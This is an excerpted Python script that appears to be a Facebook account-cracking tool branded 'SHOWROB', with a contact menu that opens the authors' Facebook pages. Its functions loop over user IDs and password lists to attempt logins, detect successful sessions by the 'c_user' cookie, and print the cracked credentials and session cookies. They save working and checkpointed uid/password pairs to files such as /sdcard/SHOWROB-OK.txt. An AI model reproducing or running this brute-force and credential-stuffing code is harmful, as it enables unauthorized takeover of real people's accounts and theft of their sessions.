...
#os.system("xdg-open https://www.facebook.com/ITS.DEVIL.08")
...
def c():
	...
	print(" \033[1;37m[1] \033[1;32mCONTACT ")
	...
	if ok =='1':
		...
		os.system("xdg-open https://www.facebook.com/ITS.DEVIL.08");Main()

	if ok =='2':

		os.system("xdg-open https://www.facebook.com/SHOWROB009");Main()

	if ok =='3':

		print("\033[0;97m USER NAME :\033[0;92m  its.showrob.bbz0 ")
...
class Random:
    ...
    def fbtua(self):
        ...
        try:
            ...
            print("%s\n\033[0;97m[+] \033[0;92mOK RESULTS SAVED IN -> SHOWROB-OK.txt" % (G))

            print("%s\033[0;97m[+] \033[0;91mCP RESULTS SAVED IN -> SHOWROB-CP.txt" % (Y))
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write("\r\r %s\033[0;97m[\033[0;92m SHOWROB \033[0;97m]\033[0;97m  %s\033[0;97m/\033[0;92m%s \033[0;97m[\033[0;92mOK\033[0;91m:\033[0;92m%s\033[0;97m]" % (B, self.loop, len(self.id), len(self.cp)));sys.stdout.flush()
        ...
        for pw in pwx:
            ...
            if "www.facebook.com" in response.json()["error_msg"]:
                ...
                open("SHOWROB-OK.txt", "a").write("  %s√%s\n" % (uid, pw))
	...
	try:
		...
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				print('\33[1;92m[SHOWROB-OK] '+uid+' √ '+ps+'\33[0;97m')

				print('%s[%sCOOKIE%s] : %s%s ' % (W,Y,W,G,coki))

				

				open('SHOWROV-OK.txt', 'a').write(uid+' √ '+ps+'\n')
				...
				print('\33[1;91m[SHOWROV-CP] '+uid+' • '+ps+'\33[0;97m')

				open('SHOWROB-CP.txt', 'a').write(uid+' • '+ps+'\n')
...
def file():
		...
		print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/SHOWROB.txt");linex()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write(f'\r\r\033[1;37m[SHOWROB] %s <•> OK:- \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m[SHOWROB-OK] %s √ %s'%(ids,pas))

                                open(f'/sdcard/SHOWROB-OK.txt', 'a').write(ids+' √ '+pas+'\n')
                                ...
                                if 'y' in cp:
                                        ...
                                        print(f'\r\r\033[1;37m[SHOWROB-CP] '+ids+' • '+pas+'\033[1;97m')

                                        open(f'/sdcard/SHOWROB-CP.txt', 'a').write(ids+' • '+pas+'\n')
